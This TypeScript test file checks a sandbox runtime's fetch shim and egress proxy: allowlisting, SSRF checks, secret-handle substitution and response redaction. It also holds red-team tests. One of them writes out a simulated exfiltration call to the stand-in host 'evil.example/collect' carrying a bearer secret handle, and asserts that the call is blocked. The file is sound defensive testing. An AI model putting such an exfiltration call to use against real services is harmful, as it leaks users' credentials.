import type { RunContext, SecretsProvider } from "@vendoai/core";
import { afterEach, describe, expect, it, vi } from "vitest";
import { createApps, type AppsRuntime } from "../index.js";
import { FETCH_SHIM_BOOT_PRELUDE, FETCH_SHIM_PATH, FETCH_SHIM_SOURCE } from "../scaffold/fetch-shim.js";
import type { IpResolver } from "../ssrf.js";
import {
  basicLanguageModel,
  fakeSandbox,
  guardFixture,
  memoryStore,
  scriptedLanguageModel,
  seedAppRow,
  type FakeSandboxAdapter,
} from "../testing/index.js";

// ============================================================================
// ENG-290 M4 — the WHOLE seam, end to end, on the fake sandbox:
//
//   app code fetch(external) → REAL shim (the exact source every machine gets,
//   evaluated over the machine's REAL env) → POST {VENDO_PROXY_URL}/egress with
//   the run token → the runtime's REAL proxy → allowlist → SSRF → handle
//   substitution via SecretsProvider → forward → response secret-stripping →
//   back through the shim as an ordinary Response.
//
// Plus the red-team negatives the milestone demands:
//   - a handle used OUTSIDE the shim path reaches its target as the opaque
//     string, never the value (bypass = no auth, never a leak);
//   - the shim cannot be pointed at a non-allowlisted host — the proxy refuses
//     before any secret is read;
//   - a handle in a query string is never substituted (§4.5: the URL is never
//     rewritten).
// ============================================================================

const PROXY_URL = "http://vendo-proxy.internal";
const REAL_SECRET = "sk_live_SHIM_SEAM_ONLY";
const ALLOWED_HOST = "api.stripe.com";
const publicResolver: IpResolver = async () => ["93.184.216.34"];

const ctx: RunContext = {
  principal: { kind: "user", subject: "user_ada" },
  venue: "chat",
  presence: "present",
  sessionId: "session_shim",
};

const originalFetch = globalThis.fetch;
const originalProxyUrl = process.env.VENDO_PROXY_URL;
const originalRunToken = process.env.VENDO_RUN_TOKEN;

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalProxyUrl === undefined) delete process.env.VENDO_PROXY_URL;
  else process.env.VENDO_PROXY_URL = originalProxyUrl;
  if (originalRunToken === undefined) delete process.env.VENDO_RUN_TOKEN;
  else process.env.VENDO_RUN_TOKEN = originalRunToken;
});

interface Seam {
  runtime: AppsRuntime;
  sandbox: FakeSandboxAdapter;
  get: ReturnType<typeof vi.fn>;
  outbound: ReturnType<typeof vi.fn>;
  /** Direct sends that never went through the proxy (the bypass path). */
  directSends: Array<{ url: string; headers: Record<string, string> }>;
  /** The raw network transport underneath the shim — what a non-fetch client
   * (raw socket, spawned binary) would reach directly. */
  rawTransport: typeof globalThis.fetch;
  machineEnv: Record<string, string>;
  machineFiles: ReadonlySet<string>;
}

/** Boot a REAL runtime machine, then install the REAL shim over its env. */
const bootSeam = async (): Promise<Seam> => {
  const get = vi.fn(async (name: string): Promise<string | undefined> =>
    name === "STRIPE_KEY" ? REAL_SECRET : undefined);
  const secrets: SecretsProvider = { get };
  // The proxy's outbound transport: reflect the authorization it saw so the
  // response path can prove both substitution and redaction.
  const outbound = vi.fn(async (_url: RequestInfo | URL, init?: RequestInit) => {
    const headers = (init?.headers ?? {}) as Record<string, string>;
    return new Response(
      JSON.stringify({ sawAuthorization: headers.authorization ?? null, sawBody: init?.body ?? null }),
      { status: 200, headers: { "content-type": "application/json" } },
    );
  });
  const sandbox = fakeSandbox();
  const store = memoryStore();
  const runtime = createApps({
    store,
    guard: guardFixture(),
    tools: { async descriptors() { return []; }, async execute() { return { status: "blocked", reason: "no" }; } },
    sandbox,
    secrets,
    catalog: [],
    model: basicLanguageModel(),
    proxyUrl: PROXY_URL,
    egressTransport: { fetch: outbound as unknown as typeof globalThis.fetch, resolveIp: publicResolver },
  });

  const app = await runtime.create({ prompt: "Secret egress app" }, ctx);
  await seedAppRow(store, {
    ...app,
    ui: "http",
    egress: [ALLOWED_HOST],
    secrets: ["STRIPE_KEY"],
  }, ctx.principal.subject);
  await runtime.open(app.id, ctx);
  await vi.waitFor(() => expect(sandbox.machines.size).toBe(1));
  const machine = [...sandbox.machines.values()].at(-1)!;

  // Install the REAL shim source over the machine's REAL env, with native
  // fetch dispatching proxy-origin requests to the runtime's REAL proxy
  // handler and recording anything that would leave the sandbox directly.
  const directSends: Seam["directSends"] = [];
  process.env.VENDO_PROXY_URL = machine.env.VENDO_PROXY_URL;
  process.env.VENDO_RUN_TOKEN = machine.env.VENDO_RUN_TOKEN;
  const rawTransport = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = new Request(input, init);
    if (new URL(request.url).origin === PROXY_URL) return runtime.proxy.handler(request);
    const headers: Record<string, string> = {};
    for (const [name, value] of request.headers) headers[name] = value;
    directSends.push({ url: request.url, headers });
    return new Response("direct-target-response", { status: 200 });
  }) as typeof globalThis.fetch;
  globalThis.fetch = rawTransport;
  new Function(FETCH_SHIM_SOURCE)();

  return {
    runtime,
    sandbox,
    get,
    outbound,
    directSends,
    rawTransport,
    machineEnv: { ...machine.env },
    machineFiles: new Set(machine.fileContents.keys()),
  };
};

describe("shim → proxy → substitution → redaction, end to end", () => {
  it("app code authenticates to an allowlisted host with plain fetch and never sees the value", async () => {
    const seam = await bootSeam();

    // The machine was created carrying the shim file (boot convention input)...
    expect(seam.machineFiles.has(FETCH_SHIM_PATH)).toBe(true);
    // ...and its env carries the handle, never the value.
    const handle = seam.machineEnv.STRIPE_KEY as string;
    expect(handle).toMatch(/^vendo-secret:STRIPE_KEY:[0-9a-f]{8}$/);

    // Ordinary app code: plain fetch, secret env var in the header AND body.
    const response = await fetch(`https://${ALLOWED_HOST}/v1/charges`, {
      method: "POST",
      headers: { authorization: `Bearer ${handle}` },
      body: `amount=100&key=${handle}`,
    });

    // The proxy substituted the REAL value on the outbound hop...
    expect(seam.get).toHaveBeenCalledWith("STRIPE_KEY");
    expect(seam.outbound).toHaveBeenCalledTimes(1);
    const outboundInit = seam.outbound.mock.calls[0]?.[1] as RequestInit;
    expect((outboundInit.headers as Record<string, string>).authorization).toBe(`Bearer ${REAL_SECRET}`);
    expect(String(outboundInit.body)).toContain(REAL_SECRET);
    // ...never forwarded the run token to the target...
    expect(JSON.stringify(outboundInit.headers)).not.toContain(seam.machineEnv.VENDO_RUN_TOKEN);
    // ...and nothing left "the sandbox" outside the proxy hop.
    expect(seam.directSends).toHaveLength(0);

    // The response the APP sees is an ordinary Response with the reflected
    // secret redacted: the value never enters the sandbox, even on the way back.
    expect(response.status).toBe(200);
    const body = await response.text();
    expect(body).toContain("[vendo-secret-redacted]");
    expect(body).not.toContain(REAL_SECRET);
  });

  it("internal requests to the app's own server bypass the proxy untouched", async () => {
    const seam = await bootSeam();
    const response = await fetch("http://127.0.0.1:8080/fn/total", { method: "POST", body: '{"args":{}}' });
    expect(await response.text()).toBe("direct-target-response");
    expect(seam.directSends).toHaveLength(1);
    expect(seam.directSends[0]?.url).toBe("http://127.0.0.1:8080/fn/total");
    expect(seam.outbound).not.toHaveBeenCalled();
    expect(seam.get).not.toHaveBeenCalled();
  });
});

describe("the boot convention delivers the shim", () => {
  it("rung-2/3 boots carry the shim file and require it via NODE_OPTIONS", async () => {
    const sandbox = fakeSandbox();
    const runtime = createApps({
      store: memoryStore(),
      guard: guardFixture(),
      tools: { async descriptors() { return []; }, async execute() { return { status: "blocked", reason: "no" }; } },
      sandbox,
      catalog: [],
      model: scriptedLanguageModel(
        '<App name="Boot convention app"><Text text="hi"/></App>',
        JSON.stringify({
          rung: 2,
          files: [{
            path: "/app/server.js",
            content: 'const http = require("node:http");\nhttp.createServer((q, s) => { s.writeHead(200); s.end("{}"); }).listen(Number(process.env.PORT || 8080));\n',
          }],
        }),
      ),
    });
    const app = await runtime.create({ prompt: "Show a greeting" }, ctx);
    const edited = await runtime.edit(app.id, "Add a server backend to persist data", ctx);
    expect(edited.issues, edited.issues?.join("; ")).toBeUndefined();

    const machine = [...sandbox.machines.values()].at(-1)!;
    // The machine carries the runtime-owned shim bytes...
    expect(new TextDecoder().decode(await machine.files.read(FETCH_SHIM_PATH))).toBe(FETCH_SHIM_SOURCE);
    // ...and the ensure-serving boot requires them into the server's node processes.
    const boot = machine.commands.map((command) => command.cmd)
      .find((cmd) => cmd.includes("elif [ -f /app/server.js ]"));
    expect(boot).toBeDefined();
    expect(boot).toContain(FETCH_SHIM_BOOT_PRELUDE);
  });
});

describe("red team: the shim adds no new way to reach a secret", () => {
  it("cannot be pointed at a non-allowlisted host — refused before any secret is read", async () => {
    const seam = await bootSeam();
    const handle = seam.machineEnv.STRIPE_KEY as string;
    await expect(fetch("https://evil.example/collect", { headers: { authorization: `Bearer ${handle}` } }))
      .rejects.toThrow(/egress-blocked/);
    expect(seam.get).not.toHaveBeenCalled();
    expect(seam.outbound).not.toHaveBeenCalled();
    expect(seam.directSends).toHaveLength(0);
  });

  it("a handle used OUTSIDE the shim path reaches its target as the opaque string, never the value", async () => {
    const seam = await bootSeam();
    const handle = seam.machineEnv.STRIPE_KEY as string;
    // A raw client that skips the shimmed fetch entirely (raw socket, spawned
    // binary): it reaches the target directly — but everything it can send is
    // the opaque handle, because the value never entered the machine.
    await seam.rawTransport(`https://${ALLOWED_HOST}/raw-socket`, {
      headers: { authorization: `Bearer ${handle}` },
    });
    expect(seam.directSends).toHaveLength(1);
    expect(seam.directSends[0]?.headers.authorization).toBe(`Bearer ${handle}`);
    expect(JSON.stringify(seam.machineEnv)).not.toContain(REAL_SECRET);
    expect(seam.get).not.toHaveBeenCalled();
  });

  it("a handle in a query string is never substituted — the URL is never rewritten (§4.5)", async () => {
    const seam = await bootSeam();
    const handle = seam.machineEnv.STRIPE_KEY as string;
    await fetch(`https://${ALLOWED_HOST}/v1/charges?key=${handle}`);
    expect(seam.outbound).toHaveBeenCalledTimes(1);
    const forwardedUrl = String(seam.outbound.mock.calls[0]?.[0]);
    expect(forwardedUrl).toContain(handle);
    expect(forwardedUrl).not.toContain(REAL_SECRET);
  });
});
